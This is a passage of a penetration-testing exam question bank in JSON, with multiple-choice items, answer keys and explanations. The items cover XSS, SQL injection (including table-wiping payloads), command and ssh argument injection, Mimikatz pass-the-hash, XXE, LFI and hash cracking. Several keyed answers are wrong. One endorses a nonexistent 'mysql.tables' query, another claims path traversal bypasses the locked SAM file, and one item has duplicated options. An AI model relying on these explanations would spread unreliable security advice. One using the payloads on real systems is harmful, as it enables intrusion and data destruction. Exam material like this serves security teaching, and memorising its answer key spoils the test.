      "options":[
        "a) XSS; `#<script>alert(1)</script>`",
        "b) Open Redirect; `#/../../sensitive_page`",
        "c) DOM-based XSS; `#javascript:alert(1)`",
        "d) DOM-based XSS; `#/index.html#<script>alert(1)</script>`"

      ],
      "correctAnswerIndex": 2,
      "explanation": "This code takes the portion of the URL *after* the `#` (the fragment identifier) and uses it to set the `window.location.href`, effectively redirecting the browser.  This is a DOM-based XSS vulnerability because the client-side JavaScript is manipulating the DOM based on user-controlled input (the hash).  The correct payload is `#javascript:alert(1)`. The `javascript:` pseudo-protocol allows executing JavaScript code directly in the URL. The `substring(1)` removes the leading `#`, leaving `javascript:alert(1)` which will be executed by the browser.",
      "examTip": "Be highly suspicious of JavaScript code that manipulates `window.location` based on user-controlled parts of the URL, especially the `hash` fragment. This is a common pattern for DOM-based XSS."
    },
    {
        "id": 32,
        "question": "You are performing a penetration test against a Windows domain network. You have obtained the NTLM hash of a domain user's password. You want to use Mimikatz to perform a Pass-the-Hash attack and obtain a Kerberos ticket for that user. Which Mimikatz command is specifically designed for this purpose?",
        "options":[
          "a) `sekurlsa::logonpasswords`",
          "b) `sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<ntlm_hash>`",
          "c) `kerberos::ptt /ticket:<ticket_data>`",
          "d) `lsadump::sam`"
        ],
        "correctAnswerIndex": 1,
        "explanation": "`sekurlsa::logonpasswords` displays available credentials, but it's not used for *injecting* a hash. `kerberos::ptt` is for *importing* existing Kerberos tickets, not creating them from an NTLM hash. `lsadump::sam` extracts hashes from the local SAM database. The correct command is `sekurlsa::pth`. This command allows you to "pass the hash" - to use the NTLM hash directly for authentication, without needing to crack it into the plaintext password.  It effectively creates a new logon session with the provided credentials.",
        "examTip": "Mimikatz's `sekurlsa::pth` command is essential for performing Pass-the-Hash attacks on Windows systems, allowing you to authenticate using an NTLM hash directly."
    },
    {
        "id": 33,
        "question": "You are analyzing a web application and discover a potential Reflected Cross-Site Scripting (XSS) vulnerability. The application reflects user input in an HTML attribute, as shown below: `<input type="text" value="USER_INPUT">`.  The application filters `<` and `>` characters.  Which of the following payloads is MOST likely to bypass this filter and achieve XSS?",
        "options": [
            "a) `<script>alert(1)</script>`",
            "b) `\" onmouseover=\"alert(1)`",
            "c) `javascript:alert(1)`",
            "d) `' autofocus onfocus='alert(1)`"
        ],
        "correctAnswerIndex": 3,
        "explanation": "Injecting a full `<script>` tag is impossible due to the filtering.  Using `\"` to break out of the attribute value and then using an event handler *would* work, but it requires the ability to inject a double quote, which may also be filtered/encoded.  Using `javascript:` directly won't work within the `value` attribute. The most reliable bypass, given the constraints, is to inject `' autofocus onfocus='alert(1)`. This closes the `value` attribute with a single quote, adds the `autofocus` attribute (which automatically focuses the element), and then uses the `onfocus` event handler to execute the JavaScript. The `autofocus` attribute ensures the `onfocus` event triggers immediately.",
        "examTip": "When exploiting XSS in HTML attributes, consider using event handlers (like `onmouseover`, `onfocus`, `onerror`) and techniques like `autofocus` to trigger the payload without requiring user interaction."
    },
    {
        "id": 34,
          "question": "You are analyzing the following snippet of a bash script used for system administration:\n```bash\n#!/bin/bash\nREPORT_DIR=\"/var/reports\"\nUSER_INPUT=$1\nmkdir -p \"$REPORT_DIR/$USER_INPUT\"\n```\nWhat is the PRIMARY vulnerability in this script, and what is a potential exploit string?",
        "options":[
          "a) Command Injection, exploit: `'; id;'`",
          "b) Path Traversal, exploit: `../../etc`",
          "c) Command Injection, exploit: `$(id)`",
          "d) Path Traversal, exploit: `foo/bar`"
        ],
        "correctAnswerIndex": 1,
        "explanation": "While command injection *is* possible with flawed quoting, the *primary* and most direct vulnerability is path traversal. The script takes user input (`$1`) and uses it to create a directory *within* `/var/reports`.  However, there's no sanitization of the input. By providing `../../etc` as input, the script will attempt to create the directory `/var/reports/../../etc`, which effectively becomes `/etc`. If the script is running with sufficient privileges (e.g., as root), this could allow the attacker to create arbitrary directories or potentially overwrite existing ones, depending on the `-p` flag's behavior with existing directories.",
        "examTip": "Always be cautious of scripts that construct file paths or directory names using unsanitized user input. This is a common source of path traversal vulnerabilities."
    },
    {
        "id": 35,
        "question": "Consider the following Python code snippet, designed to connect to a remote server and execute a command:\n```python\nimport subprocess\n\nhost = input(\"Enter host: \")\ncommand = input(\"Enter command: \")\n\nsubprocess.run([\"ssh\", host, command])\n```\nWhat is the PRIMARY vulnerability, and how can it be MOST effectively exploited?",
        "options":[
          "a) Command Injection, providing `localhost; id` for the command.",
          "b) Argument Injection, providing a malicious option to ssh via the host.",
          "c) The code is secure due to the use of `subprocess.run`.",
          "d) Command injection, providing `$(id)`."
        ],
        "correctAnswerIndex": 1,
        "explanation": "Using `subprocess.run` with a *list* of arguments, as shown, *prevents* traditional command injection using semicolons or command substitution. The vulnerability is *argument injection*. The `ssh` command accepts various options. An attacker can provide a malicious option *via the `host` variable*. For example, they could enter `-oProxyCommand=bash -c id` for the `host`. This would cause `ssh` to execute `bash -c id` *before* connecting, achieving code execution. This bypasses the intended use of `subprocess.run` to prevent command injection.",
        "examTip": "Even when using `subprocess.run` (or similar functions) with a list of arguments, be aware of *argument injection* vulnerabilities, where attackers can inject malicious options to the underlying command."
    },
    {
    "id": 36,
     "question": "You are investigating a compromised web server and find the following entry in the Nginx error log: `[error] 2345#0: *1 open() \"/var/www/html/images/../../../etc/passwd\" failed (2: No such file or directory), client: 192.168.1.100, server: example.com, request: \"GET /images/../../../etc/passwd HTTP/1.1\", host: \"example.com\"` What type of attack was attempted, and was it likely successful based on this log entry?",
     "options":[
      "a) SQL Injection, unsuccessful",
      "b) Path Traversal, unsuccessful",
      "c) XSS , unsuccessful.",
      "d) Command Injection, unsuccessful"
     ],
      "correctAnswerIndex": 1,
      "explanation": "The log entry shows an attempt to access `/etc/passwd` using a relative path (`../../../etc/passwd`) within the `/images/` directory. This is a classic path traversal attempt.  The error message `failed (2: No such file or directory)` indicates that the attack was *unsuccessful*. The web server (Nginx in this case) likely prevented the traversal, or the constructed path was incorrect.",
      "examTip": "Web server error logs often contain valuable information about attempted attacks. Look for patterns like path traversal sequences (`../`) and error codes indicating failed attempts."

    },
    {
    "id": 37,
    "question":"You are performing a penetration test and are trying to crack a password hash. You know the password policy requires at least 8 characters, one uppercase letter, one lowercase letter, one number, and one special character. You have a wordlist containing common words and a set of rules for mangling those words. Which tool and technique is BEST suited to efficiently generate passwords that meet this policy, combining the wordlist and rules?",
    "options":[
        "a) John the Ripper, with its built in rule engine",
        "b) Hashcat, using a mask attack.",
        "c) Hashcat, using a combination attack.",
        "d) John the Ripper using wordlist attack."
    ],
    "correctAnswerIndex": 0,
    "explanation":"Hashcat's mask attack is efficient for specific patterns but less flexible for combining a *wordlist* with complex *rules*. Hashcat's combination attack combines multiple wordlists. John The Ripper is correct because it has a powerful *rule engine* specifically designed for this purpose. You can define rules to add prefixes, suffixes, change case, substitute characters, etc., and apply these rules to a base wordlist. This allows you to efficiently generate passwords that meet the complex policy requirements.",
    "examTip": "John the Ripper's rule engine is a powerful feature for generating password candidates based on wordlists and complex mangling rules, making it ideal for cracking passwords with specific policy requirements."
    },
    {
        "id": 38,
        "question":"You are analyzing a web application and discover a potential SQL injection vulnerability. You've determined that the application is using a MySQL database. You want to enumerate the names of all tables in the current database. Which of the following SQL injection payloads is MOST likely to achieve this?",
        "options":[
            "a) `1' UNION SELECT table_name FROM information_schema.tables--`",
            "b) `1' UNION SELECT table_name FROM mysql.tables WHERE table_schema = database()--`",
            "c) `1'; SELECT table_name FROM information_schema.tables--`",
            "d) `1' UNION SELECT * FROM information_schema.tables--`"
        ],
        "correctAnswerIndex": 1,
        "explanation": "Option (c) uses a stacked query, which may not be supported. Selecting `*` (option d) is inefficient and might cause errors if the number of columns doesn't match. Option (a) is a valid approach, but it retrieves tables from *all* databases, not just the current one. The most precise payload is (b). It queries the `mysql.tables` table (specific to MySQL) and uses the `database()` function to restrict the results to the *currently selected* database.",
        "examTip": "When enumerating tables in a MySQL database via SQL injection, use the `mysql.tables` table and the `database()` function for precision and efficiency."
    },
     {
        "id": 39,
        "question":"You are performing a penetration test on a wireless network using WPA2 Enterprise with PEAP-MSCHAPv2. You have set up a rogue access point using hostapd-wpe and are attempting to capture user credentials. However, you are not capturing any credentials, even though you see clients connecting to your rogue AP. What is the MOST likely reason?",
        "options":[
            "a) The clients are using EAP-TLS instead of PEAP-MSCHAPv2.",
            "b) The clients are configured to validate the server's certificate.",
            "c) The clients are using WPA3-Enterprise.",
            "d) You have incorrectly configured your rogue APs SSID."

        ],
        "correctAnswerIndex": 1,
        "explanation": "If clients were using EAP-TLS or WPA3, they wouldn't connect to your AP configured for PEAP-MSCHAPv2. An incorrectly configured SSID would prevent clients from connecting at all. The *most likely* reason is that the clients are configured to *validate the server's certificate*. PEAP-MSCHAPv2 is vulnerable to man-in-the-middle attacks *if* the client doesn't verify the server's certificate. If clients are configured to validate (which is best practice), they will detect your rogue AP's fake certificate and refuse to authenticate.",
        "examTip": "Client-side certificate validation is a critical security control for WPA2-Enterprise, especially with PEAP-MSCHAPv2. If clients validate, man-in-the-middle attacks are significantly harder."
    },
{
    "id": 40,
    "question": "You are analyzing a binary executable using a disassembler. You suspect the binary might be packed or obfuscated. Which of the following characteristics, observed within the disassembled code, would be the STRONGEST indicator of packing or obfuscation?",
    "options":[
        "a) A large number of function calls.",
        "b) The presence of standard library functions (e.g., printf, malloc).",
        "c) A small amount of code followed by a large block of seemingly random data and a jump to a location within that data.",
        "d) Use of descriptive variable and function names."

    ],
    "correctAnswerIndex": 2,
    "explanation": "A large number of function calls is normal. Standard library functions are expected. Descriptive names suggest the *opposite* of obfuscation. The strongest indicator of packing or obfuscation is a small amount of initial code (the *unpacker* or *deobfuscator*), a large block of data (the *packed* or *obfuscated* code), and then a jump instruction that transfers control to a location *within* that data block. This suggests that the initial code is unpacking or deobfuscating the data in memory and then executing it.",
    "examTip": "In disassembled code, look for a small amount of code, a large data block, and a jump into that data as a strong indicator of packing or obfuscation."
},
{
  "id": 41,
  "question": "Examine the following Burp Suite Repeater request:\n```http\nPOST /api/v1/user/update HTTP/1.1\nHost: api.example.com\nContent-Type: application/json\nCookie: sessionid=abcdefg1234567\n\n{\"username\": \"testuser\", \"email\": \"test@example.com\", \"role\": \"user\"}\n```\nYou suspect a potential privilege escalation vulnerability. Which modification to the request is MOST likely to reveal this vulnerability, assuming the application uses role-based access control?",
  "options":[
      "a) Changing `username` to a different value.",
      "b) Changing `email` to a different value.",
      "c) Changing `role` to `admin`.",
      "d) Removing the `Cookie` header."
    ],
  "correctAnswerIndex": 2,
  "explanation": "Modifying the `username` or `email` is unlikely to affect privileges. Removing the `Cookie` would likely result in an authentication error, not privilege escalation. The key parameter here is `role`.  If the application blindly trusts the `role` value provided in the request *without* proper authorization checks, changing it to `admin` (or a similar privileged role) could grant the user administrative privileges. This is a classic example of insecure direct object reference (IDOR) applied to role-based access control.",
  "examTip": "When testing for privilege escalation in APIs, focus on parameters that control access levels or roles.  Attempt to modify these parameters to elevate privileges."
},
{
  "id": 42,
    "question": "Analyze this `iptables` rule: `iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --set --name SSH --rsource`.  What is the PRIMARY purpose of this rule?",
  "options":[
      "a) To allow all incoming SSH connections.",
      "b) To block all incoming SSH connections.",
      "c) To rate-limit incoming SSH connections, mitigating brute-force attacks.",
      "d) To log all incoming SSH connections."
  ],
  "correctAnswerIndex": 2,
  "explanation": "The rule allows (`-A INPUT`) TCP traffic destined for port 22 (`--dport 22`, which is SSH). `-m state --state NEW` matches only *new* connection attempts. The crucial part is `-m recent --set --name SSH --rsource`. This uses the `recent` module to track *new* connection attempts from a source IP address.  This is the *first* part of a rate-limiting setup. A *separate* rule (not shown) would then *drop* or *reject* connections if the source IP exceeds a certain rate (tracked by the `recent` module). This is a common technique to mitigate SSH brute-force attacks.",
    "examTip": "The `iptables` `recent` module is frequently used for rate-limiting connections, often to protect services like SSH from brute-force attacks. It usually involves *two* rules: one to track connections and another to act based on the tracked rate."
},
{
    "id": 43,
    "question": "You are performing a penetration test against a web application that uses JWT (JSON Web Tokens) for authentication. After intercepting a JWT, you decode the header and payload. You modify the payload to grant yourself administrator privileges, re-encode the token (using base64url encoding), and replace the original token in your request.  The server responds with a '200 OK' and grants you administrator access.  What is the MOST likely vulnerability?",
    "options": [
        "a) The JWT is not being validated.",
        "b) The JWT is using a weak signing algorithm (e.g., HS256 with a weak secret).",
        "c) The JWT is using the 'none' algorithm.",
        "d) The application has no CSRF"
    ],
    "correctAnswerIndex": 2,
    "explanation":"The key is that you modified the payload, re-encoded it *without signing*, and the server accepted it. If the token *was* being validated with a weak signing algorithm (b), you would need to *know* the secret key to forge a valid signature. If no validation was happening at all, simply sending garbage data will give same result. The most likely, specific reason is the use of the `alg: none` vulnerability. The server is accepting JWTs *without any signature verification*, allowing trivial forgery by simply modifying the payload and re-encoding.",
    "examTip": "The `alg: none` vulnerability in JWT implementations is critical. Servers must *never* accept JWTs without a valid signature, and must reject tokens specifying `alg: none`."
},
    {
    "id": 44,
     "question": "You are assessing an IoT device and have obtained access to its firmware. Using `binwalk`, you extract the firmware and find a filesystem containing a file named `shadow.sample`. This file contains the following line: `root:$1$ লবণ $Z941.9k8l1v5tI4.X5P5/:16431:0:99999:7:::`. What does this line represent, what is the hashing algorithm, and is the password easily crackable?",
     "options":[
       "a) A user account entry, MD5, easily crackable.",
       "b) A user account entry, SHA-512, not easily crackable",
       "c) A user account entry, bcrypt, not easily crackable.",
        "d) A user account entry, SHA-256, not easily crackable."
     ],
     "correctAnswerIndex": 0,
     "explanation": "This line is a standard entry from a Unix-like `/etc/shadow` file, representing a user account (in this case, `root`). The format is: `username:password_hash:last_password_change:...`. The password hash starts with `$1$`, which indicates the **MD5** hashing algorithm. The part between the second and third `$` is the *salt*, and the remaining part is the actual hash. MD5 is considered cryptographically broken, and passwords hashed with MD5 (especially with weak or short salts) are *easily crackable* using modern tools and hardware.",
     "examTip": "Recognize the format of `/etc/shadow` file entries and the identifiers for different hashing algorithms (e.g., `$1$` for MD5, `$6$` for SHA-512, `$2a$` or `$2y$` for bcrypt). MD5 is considered insecure."
    },
    {
      "id": 45,
      "question": "You are analyzing network traffic captured from a compromised host. You observe a large number of outbound connections to various IP addresses on TCP port 6667, a port commonly associated with IRC (Internet Relay Chat). The traffic is encrypted. What is the MOST likely explanation, *and* what further analysis would be most helpful?",
      "options":[
        "a) The host is participating in a legitimate IRC network.",
        "b) The host is infected with malware that uses IRC for command and control (C&C).",
        "c) The host is running an SSH server.",
        "d)The host is being used for DoS attacks."
      ],
      "correctAnswerIndex": 1,
      "explanation": "While legitimate IRC usage is *possible*, encrypted connections to *numerous* different servers on port 6667 are highly suspicious. SSH uses port 22 by default. A DoS attack will have different traffic. The most likely explanation is malware using IRC for command and control (C&C).  Malware often uses IRC (even encrypted IRC) because it's a well-established protocol, and firewalls are less likely to block it. The *next* step would be to attempt to decrypt the traffic (if possible) or to perform dynamic analysis of the suspected malware on the host (in a sandboxed environment) to observe its behavior.",
      "examTip": "Encrypted traffic on port 6667 (IRC) to multiple destinations is a strong indicator of potential malware using IRC for command and control. Follow up with decryption attempts or dynamic malware analysis."
    },
     {
        "id": 46,
        "question": "During a web application penetration test, you encounter a page that generates PDF documents based on user input. You suspect a potential command injection vulnerability within the PDF generation process. Which of the following input strings is MOST likely to reveal this vulnerability, assuming the backend uses a common Linux command-line utility for PDF generation?",
        "options": [
            "a) `<script>alert(1)</script>`",
            "b) `'; id; '`",
            "c) `$(id)`",
            "d) `\"; id; \"`"
        ],
        "correctAnswerIndex": 1,
        "explanation": "Injecting JavaScript is relevant for XSS, not command injection in a PDF generator. Using `$(id)` might work in *some* contexts, but is less reliable than the classic semicolon-based injection. Using `\"` to try to escape quotes is a good technique, but is less likely to be the *initial* test. The most direct and common test for command injection is to use a semicolon (`;`) to separate commands.  If the backend is vulnerable, injecting `'; id; '` will likely cause the `id` command to be executed, and the output (the user ID) might be included in the generated PDF, or cause an error revealing the injection.",
        "examTip": "The semicolon (`;`) is a fundamental command separator in Linux/Unix shells and is a primary character to use when testing for command injection vulnerabilities."
    },
    {
      "id":47,
      "question": "You are analyzing a web application that uses a custom-built encryption scheme to protect sensitive data stored in cookies. You notice that the ciphertext values are always the same length, regardless of the length of the plaintext data. What type of encryption is MOST likely being used, and what is a major security concern associated with it?",
      "options": [
        "a) Stream cipher; Vulnerable to bit-flipping attacks.",
        "b) Block cipher in ECB mode; Leaks information about the plaintext structure.",
        "c) Block cipher in CBC mode; Requires a secure IV.",
        "d) Asymmetric encryption; Requires secure key management."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Stream ciphers produce ciphertext that's the *same* length as the plaintext. Asymmetric encryption (like RSA) is typically used for key exchange, not for encrypting large amounts of data. CBC mode requires a secure IV, but the described behavior is more specific. The key is that the ciphertext length is *constant*, regardless of plaintext length. This strongly indicates a *block cipher* operating in *ECB (Electronic Codebook) mode*. ECB encrypts each block independently, so identical plaintext blocks produce identical ciphertext blocks. This leaks information about repeated patterns in the plaintext and makes it vulnerable to various attacks.",
      "examTip": "A constant ciphertext length, independent of plaintext length, is a hallmark of block ciphers in ECB mode, which is highly insecure due to information leakage."
    },
       {
    "id": 48,
    "question": "You have intercepted a JWT (JSON Web Token) and decoded the header, which contains the following: `{\"alg\": \"HS256\", \"typ\": \"JWT\"}`. You have also obtained a file that you suspect might contain the secret key used to sign the JWT.  Which tool, and with what specific command, would be MOST effective to verify if this file contains the correct secret key?",
    "options": [
        "a) `jwt_tool`, using `jwt_tool -V -t <token> -k <keyfile>`",
        "b) `hashcat`, using `hashcat -m 16500 <token> <keyfile>`",
        "c) `john`, using `john --wordlist=<keyfile> --format=jwt <token>`",
        "d) Burp Suite's Decoder, using the 'Decode as ...' option."
    ],
    "correctAnswerIndex": 0,
    "explanation": "`hashcat` and `john` are password cracking tools, not JWT *verification* tools. Burp Suite's Decoder can decode JWTs, but it can't verify signatures against a key file. `jwt_tool` is a command-line tool specifically designed for working with JWTs. The `-V` option verifies the signature, `-t` specifies the token, and `-k` specifies the key file.  If the key file contains the correct secret, `jwt_tool` will confirm the signature's validity; otherwise, it will indicate a signature failure.",
    "examTip": "Use specialized tools like `jwt_tool` for verifying JWT signatures and testing for weaknesses related to key management or algorithm choices."
},
{
    "id": 49,
    "question": "You are performing a penetration test against a network that uses WPA2-Enterprise with EAP-TTLS. You have set up a rogue access point and are attempting to capture user credentials. Which of the following inner authentication methods, used *within* EAP-TTLS, would allow you to capture credentials in *cleartext*?",
    "options": [
        "a) MSCHAPv2",
        "b) EAP-FAST",
        "c) PAP",
        "d) PEAP"
    ],
    "correctAnswerIndex": 2,
    "explanation": "MSCHAPv2, while vulnerable, sends a *challenge-response*, not cleartext credentials. EAP-FAST is a Cisco-proprietary protocol and doesn't inherently send cleartext credentials. PEAP is a *tunneling* method, similar to EAP-TTLS; it doesn't define the *inner* authentication.  The key is *PAP (Password Authentication Protocol)*. PAP transmits passwords in *cleartext*. When used as the *inner* authentication method within EAP-TTLS (or PEAP), the TLS tunnel protects the PAP exchange *from eavesdropping on the wireless network*, but a rogue AP can intercept the cleartext credentials *because it terminates the TLS tunnel*. This is a significant weakness.",
    "examTip": "The use of PAP as the inner authentication method within EAP-TTLS (or PEAP) creates a vulnerability where a rogue access point can capture credentials in cleartext."
},
{
 "id": 50,
  "question": "You are analyzing the following `iptables` ruleset:\n```bash\niptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A INPUT -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -p tcp --dport 443 -j ACCEPT\niptables -A INPUT -j DROP\n```\nWhat is the overall purpose of this ruleset, and what is a potential security concern?",
 "options":[
   "a) To allow only HTTP and HTTPS traffic; Potential for unencrypted HTTP traffic.",
   "b) To allow only established connections; Potential for denial of service.",
   "c) To allow HTTP, HTTPS, and established connections, blocking all other incoming traffic; Potential for services running on non-standard ports to be inaccessible.",
   "d) To allow all traffic; Potential for unauthorized access."
 ],
    "correctAnswerIndex": 2,
    "explanation": "The first rule allows *established* and *related* connections (essential for stateful firewalls). The next two rules explicitly allow incoming traffic on TCP ports 80 (HTTP) and 443 (HTTPS). The final rule *drops* all other incoming traffic. This creates a basic firewall that allows HTTP, HTTPS, and established connections, while blocking all other *new* incoming connections. A potential security concern is that any *other* services running on *non-standard ports* will be inaccessible from outside the network. This could include legitimate services (e.g., a custom API, an SSH server on a different port) that are unintentionally blocked.",
    "examTip": "`iptables` rulesets should be carefully designed to allow necessary traffic while blocking unwanted connections. Explicitly allowing specific ports and using a default-drop rule is a common practice, but can inadvertently block legitimate services on non-standard ports."
},
{
      "id": 51,
      "question": "You are analyzing a web application and discover a potential XML External Entity (XXE) vulnerability. Examine the following XML payload:\n```xml\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM \"file:///dev/random\">\n]>\n<foo>&xxe;</foo>\n```\nWhat is the MOST likely outcome if this payload is processed by a vulnerable XML parser, and WHY?",
      "options": [
          "a) The contents of `/etc/passwd` will be displayed.",
          "b) The application will likely hang or crash due to an infinite loop.",
          "c) The application will return an error indicating that external entities are not allowed.",
          "d) The application will return the string \"/dev/random\"."
      ],
      "correctAnswerIndex": 1,
      "explanation": "The payload defines an external entity (`xxe`) that references `/dev/random`, a special file on Unix-like systems that provides an endless stream of random data. If the XML parser is vulnerable to XXE and attempts to resolve this entity, it will try to read from `/dev/random` *indefinitely*. This will likely cause the application to hang (become unresponsive) or crash due to resource exhaustion.  It *won't* display `/etc/passwd`. It *might* return an error if external entities are disabled, but if it's vulnerable, the described behavior is most likely.",
      "examTip": "Using `/dev/random` (or `/dev/zero`) in XXE payloads is a useful technique to test for vulnerabilities and potentially cause denial-of-service by consuming resources."
    },
    {
    "id": 52,
    "question": "You have obtained a shell on a compromised Linux system. While enumerating running processes, you identify a suspicious process with a very long and complex command line. You want to thoroughly inspect the entire command line, including all arguments, even if they exceed the terminal's width. Which command is BEST suited for this task, providing the most complete and unabridged view of the command line?",
    "options":[
      "a) `ps -ef`",
      "b) `top`",
      "c) `ps auxww`",
      "d) `pgrep -a <pid>`"

    ],
    "correctAnswerIndex": 2,
    "explanation": "`ps -ef` is a good start, but it often truncates long command lines. `top` is for monitoring system resources, not for displaying full command lines. `pgrep -a <pid>` shows the full command line *if you know the PID*, but it's less convenient for general enumeration. `ps auxww` is the best option. The `ww` option (sometimes just `w`, depending on the `ps` implementation) tells `ps` to display the *full* command line, *without truncation*, regardless of its length.  This is crucial for identifying suspicious arguments or hidden parameters.",
    "examTip": "Use `ps auxww` (or `ps aux` with a single `w` if `ww` doesn't work) on Linux systems to view the *complete*, untruncated command lines of running processes, which is essential for thorough investigation during post-exploitation."
    },
    {
    "id": 53,
     "question": "You have discovered a web application that is vulnerable to SQL injection in a `DELETE` statement. The application uses a MySQL database. You want to delete *all* records from a table named `users`, but you don't know the exact structure of the table (i.e., the column names). Which of the following SQL injection payloads is MOST likely to achieve this *without* causing errors due to syntax incompatibilities?",
     "options":[
        "a) `; DELETE FROM users; --`",
        "b) `1; TRUNCATE TABLE users; --`",
        "c) `1 OR 1=1; DELETE FROM users WHERE 1=1; --`",
        "d) `1'; DROP TABLE users;--`"
     ],
     "correctAnswerIndex": 1,
     "explanation": "Using a semicolon to create a stacked query (a) is a good technique, but *if* the original query already has a `WHERE` clause, the injected `DELETE` might not delete *all* records. Adding conditions (c) is unnecessary and might cause issues if the column names are unknown. `DROP TABLE` (d) is too aggressive and might have unintended consequences. The `TRUNCATE TABLE` statement (b) is the *most* reliable and efficient way to delete *all* records from a table *without* needing to know the table's structure. It's faster than `DELETE` and less likely to be affected by existing `WHERE` clauses in the original query.",
     "examTip": "When exploiting SQL injection to delete all records from a table, `TRUNCATE TABLE` is often a more reliable and efficient choice than `DELETE`, especially when the table structure is unknown."

    },
    {
        "id": 54,
        "question": "You are analyzing a Linux system and suspect it might be compromised. You run the `ls -l /etc/cron*` command and observe the following output (among other lines):`-rw-r--r-- 1 root root  128 Oct 11 02:00 /etc/cron.d/suspicious``````-rwxr-xr-x 1 root root  256 Oct 11 02:05 /etc/cron.hourly/suspicious``````-rw------- 1 root root   64 Oct 10 23:55 /etc/cron.daily/legit`. Which of these files, based solely on this output, should you investigate MOST closely, and WHY?",
      "options":[
          "a) `/etc/cron.d/suspicious` because it is in cron.d directory.",
          "b) `/etc/cron.hourly/suspicious`, because it has execute permissions.",
          "c) `/etc/cron.daily/legit` because the file contains legit",
          "d) ALL of them."
      ],
        "correctAnswerIndex": 1,
        "explanation": "While *all* cron-related files should be reviewed during a thorough investigation, `/etc/cron.hourly/suspicious` stands out.  Files in `/etc/cron.d/` are typically configuration files *defining* cron jobs, not the scripts themselves.  `/etc/cron.daily/legit` has restrictive permissions (readable only by root), making it *less* likely to have been tampered with by a non-root attacker.  `/etc/cron.hourly/suspicious` has *execute* permissions (`rwxr-xr-x`), meaning it's a *script* that will be executed by cron every hour.  This, combined with the suspicious name, makes it the highest priority for investigation.",
        "examTip": "Pay close attention to files within `/etc/cron.hourly/`, `/etc/cron.daily/`, `/etc/cron.weekly/`, and `/etc/cron.monthly/` that have *execute* permissions. These are scripts that will be run automatically by cron."
    },
    {
        "id": 55,
        "question": "You're analyzing a web application and discover a potential blind SQL injection vulnerability. You've determined that the application uses a MySQL database. You want to confirm the vulnerability and extract the first character of the database name, one character at a time. Which of the following techniques, combined with a time-based approach, is MOST efficient and reliable?",
        "options": [
            "a) Using `UNION SELECT` to extract the character directly.",
            "b) Using the `SUBSTR()` function and comparing the ASCII value of the character to a known value, using `SLEEP()` to induce delays.",
            "c) Using the `LIKE` operator to guess the character.",
            "d) Using error based SQLi."
        ],
        "correctAnswerIndex": 1,
        "explanation": "`UNION SELECT` won't work in a *blind* scenario where you don't see the direct output. The `LIKE` operator is less precise for character-by-character extraction. Error based SQLi is good, but we are looking for the most effieicent for blind SQLi. The most efficient approach is to use the `SUBSTR()` function to extract the first character, then use the `ASCII()` function to get its numerical value, and *compare* this value to a known value.  If the comparison is true, you induce a delay using `SLEEP()`. If it's false, there's no delay.  For example: `1' AND IF(ASCII(SUBSTR(database(),1,1))=97,SLEEP(5),0)--` would cause a 5-second delay if the first character of the database name is 'a' (ASCII 97).",
        "examTip": "For efficient character-by-character extraction in blind SQL injection, use `SUBSTR()` to isolate the character, `ASCII()` to get its numerical value, and `IF()` combined with `SLEEP()` to create conditional time delays based on comparisons."
    },
      {
    "id": 56,
     "question": "You are performing a penetration test against a web application and have discovered a Local File Inclusion (LFI) vulnerability. The application is running on a Windows server. You can successfully read files like `C:\\boot.ini`. You want to retrieve the contents of the `C:\\Windows\\System32\\config\\SAM` file, which contains password hashes. However, direct attempts to access this file fail. Which technique is MOST likely to allow you to retrieve the file's contents, *given the LFI vulnerability*?",
    "options":[
        "a) Use the `php://filter` wrapper.",
        "b) Use the `..\\` path traversal sequence.",
        "c) Use the `file://` URI scheme.",
        "d) Use the `copy` command via command injection."
    ],
    "correctAnswerIndex": 1,
    "explanation": "The `php://filter` wrapper is primarily useful on PHP applications, not generally for bypassing Windows file access restrictions.  The `file://` URI scheme is often disabled or restricted.  Command injection is a separate vulnerability.  The key is that the SAM file is typically *locked* by the operating system, preventing direct access even with LFI. The most likely technique is to use the `..\\` path traversal sequence *repeatedly*.  While direct access is blocked, *sometimes* traversing *up* and then back *down* can bypass the lock, allowing you to read the file. For example: `..\\..\\..\\..\\Windows\\System32\\config\\SAM` (the number of `..\\` sequences might need to be adjusted). This is a known technique for accessing locked files on Windows via LFI.",
    "examTip": "On Windows, repeated use of the `..\\` path traversal sequence can sometimes bypass file locks and allow access to sensitive files like the SAM hive via LFI."
  },
   {
        "id": 57,
        "question": "You are analyzing a web application and find that it is vulnerable to Cross-Site Scripting (XSS) in a reflected context. The application encodes `<`, `>`, and double quotes (`"`). However, it does *not* encode single quotes (`'`).  The vulnerable parameter is reflected within a JavaScript string literal, as shown below:\n```html\n<script>\nvar message = 'USER_INPUT';\n</script>\n```\nWhich of the following payloads is MOST likely to successfully exploit this XSS vulnerability?",
        "options": [
          "a) `<script>alert(1)</script>`",
            "b) `\"><script>alert(1)</script>`",
            "c) `'; alert(1); //`",
            "d) `<script>alert(1)</script>`"

        ],
        "correctAnswerIndex": 2,
        "explanation": "Injecting a full `<script>` tag (a and d) is impossible because `<` and `>` are encoded.  Attempting to use HTML entities (d) will prevent the script from executing.  Using a double quote (b) to break out of the string won't work because double quotes are encoded. The correct payload is `'; alert(1); //`. This closes the original string literal with a single quote, executes `alert(1)`, and then comments out the rest of the line to prevent syntax errors. The single quote is *not* encoded, allowing this bypass.",
        "examTip": "When exploiting XSS within JavaScript string literals, carefully consider which characters are encoded and use unencoded characters (like single quotes if double quotes are encoded) to break out of the string context."
    },
     {
        "id": 58,
        "question": "Examine the following output from the `nmap` command:\n```\nPORT     STATE    SERVICE       VERSION\n22/tcp   open     ssh           OpenSSH 7.4 (protocol 2.0)\n80/tcp   filtered http\n443/tcp  open     ssl/http      Apache httpd 2.4.6 ((CentOS))\n3306/tcp closed   mysql\n```\nBased SOLELY on this Nmap output, what is the MOST accurate and justifiable conclusion you can draw about the target system?",
        "options":[
           "a) The system is running a web server and an SSH server.",
           "b) The system is running a web server, an SSH server, and a MySQL database server.",
           "c) The system is likely a CentOS Linux server running Apache and OpenSSH.",
           "d)The system is running window server."
        ],
        "correctAnswerIndex": 2,
